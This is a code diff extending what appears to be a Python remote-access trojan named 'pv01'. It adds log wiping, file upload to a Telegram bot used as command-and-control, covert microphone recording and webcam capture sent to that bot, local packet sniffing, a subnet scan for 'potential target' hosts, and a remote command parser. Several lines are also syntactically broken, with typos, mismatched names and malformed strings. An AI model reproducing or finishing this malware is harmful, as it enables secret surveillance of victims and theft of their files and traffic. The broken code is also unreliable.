@@ -610,4 +610,191 @@ class Logicnode:
                         file_path = os.path.join(path, file)
                         if os.path.isfile(file_path):
                             os.remove(file_path)
-                            cleaned_items.append
+                            cleaned_items.append(f"Temp file removed: {file}")
+                except Exception:
+                    cleaned_items.append(f"Temp path cleanup error: {path}")
+                    
+        # Clear Log Files
+        log_paths = [
+            os.environ['TEMP'] + "\\pv01.log",
+            os.environ['LOCALAPPDATA'] + "\\Logs\\pv01.log"
+        ]
+        for path in log_paths:
+            if os.path.exists(path):
+                try:
+                    os.remove(path)
+                    cleaned_items.append(f"Log file removed: {path}")
+                except:
+                    pass
+                    
+        return "\n".join(cleaned_items)
+        
+    def download_file(self, file_path: str) -> bool:
+        if os.path.exists(file_path):
+            return self._upload_file(file_path)
+        return False
+        
+    def upload_file(self, file_path: str) -> bool:
+        return self._upload_file(file_path)
+        
+    def _upload_file(self, file_path: str) -> bool:
+        """Uploads a file to the Telegram C2."""
+        try:
+            file_name = os.path.basename(file_path)
+            url = f"{PV01_CONFIG['API_TOKEN']{PV01_CONFIG['BOT_TOKEN']}/sendDocument"
+            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}
+            data = {"caption": f"File transfer: {file_name}", "chat_id": PV01_CONFIG["CHAT_ID"]}
+            
+            with open(file_path, "rb") as f:
+                files = {"document": (file_name, f)}
+                response = requests.post(url, headers=headers, files=files, data=data, timeout=60)
+                
+                if response.status_code == 200:
+                    return True
+        except Exception as e:
+            print(f"File upload failed: {e}")
+        return False
+        
+    def capture_microphone(self) -> bool:
+        """Captures audio from default input device."""
+        try:
+            import sounddevice as sd
+            import numpy as np
+            
+            sampling_rate = 44100
+            duration = 5
+            filename = os.path.join(os.environ['TEMP'], "pv01_audio.wav")
+            
+            recording = sd.rec(duration * sampling_rate), samplerate=sampling_rate, channels=1)
+            sd.wait()
+            
+            # Save using wave module
+            import wave
+            with wave.open(filename, 'wb') as wav_file:
+                wave_file.setnchannels(1)
+                wave_file.setsampwidth(2)
+                wav_file.setframerate(sampling_rate)
+                wav_file.writeframes(recording.tobytes())
+                
+            return self._upload_file(filename)
+        except ImportError:
+            return False
+        except Exception as e:
+            print(f"Microphone capture failed: {e}")
+            return False
+            
+    def capture_webcam(self) -> bool:
+        """Captures video from default camera."""
+        try:
+            import cv2
+            
+            cap = cv2.VideoCapture(0)
+            if not cap.isOpened():
+                return False
+                
+            ret, frame = cap.read()
+            if ret:
+                filename = os.path.join(os.environ['TEMP'], "pv01_video.mp4")
+                fourcc = cv2.VideoWriter_fourcc(*'mp4v')
+                out = cv2.VideoWriter(filename, fourcc, 20.0, (frame.shape[1], frame.shape[0]))
+                out.write(frame)
+                cap.release()
+                out.release()
+                return self._upload_file(filename)
+        except ImportError:
+            return False
+        except Excepttion as e:
+            print(f"Webcam capture failed: {e}")
+            return False
+            
+    def sniff_traffic(self) -> str:
+        """Sniffs unencrypted network traffic on local interfaces."""
+        try:
+            import scapy.all as scapy
+            sniffed_packets = []
+            
+            def process_packet(packet):
+                if packet.haslayer(scap.IP) and packet.haslayer(scapy.Raw):
+                    sniffed_packets.append({
+                        "src": packet[scapy.IP].src,
+                        "dst": packet[IP].dst,
+                        "protocol": packet[IP].proto,
+                        "data": packet[scapy.Raw].load.decode('utf-8', errors='ignore')
+                    })
+                    
+            # Sniff for 10 seconds
+            scapy.sniff(prn=process_packet, timeout=10)
+            
+            return json.dumps(sniffed_packets)
+        except ImportError:
+            return "scapy module not installed."
+        except Exception as e:
+            return f"Sniffing failed: {str(e)}"
+            
+            
+# --- Network Scanner Module ---
+
+class NetHandler:
+    def __init__(self):
+        self._local_ip = self._get_local_ip()
+        
+        
+    def _get_local_ip(self) -> str:
+        """Finds the local IP."""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            return s.getsockname()[0]
+        except:
+            return "127.0.0.1"
+            
+        
+    def scan_network(self) -> dict:
+        """Scans the local network for active device potential target."""
+        results = {}
+        try:
+            # Determine subnet based on local IP (e.g., 192.168.1.5 -> 192.168.1.0/24)
+            parts = self._local_ip.split('.')
+            if len(parts) == 4:
+                subnet = f"{parts[0]}.{parts[1]}.{parts[2]}."
+                for i in range(1, 254):
+                    ip = f"{subnet}{i}"
+                    # Use socket to check
+                    try:
+                         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                             s.settimeout(0.5)
+                            s.connec((ip, 80))
+                            results[ip] = "HTTP Port Open"
+                    except:
+                        results[ip] = "Inactive"
+        except Exception as e:
+            results["error"] = str(e)
+        return results
+        
+        
+# --- Command Parser Module ---
+
+class CmdParser:
+    def __init__(self):
+        self._parser = {}
+        
+    
+    def register_command(self, command_name: str, callback, description: str = ""):
+        self._parser[command_name] = {"func": callback, "desc": description}
+        
+        
+    def parse(self, text: str, datastream: Datastream, Logicnode) -> str:
+        parts = text.split()
+        if not parts:
+            return "Usage: [command] [args]"
+            
+        cmd = parts[0].lower()
+        args = parts[1:]
+        
+        if cmd in self._parser:
+            func = self._parser[cmd]["func"]
+            try:
+                if len(args) > 0:
+                    return func(*args)
+                else:
+                    return func()
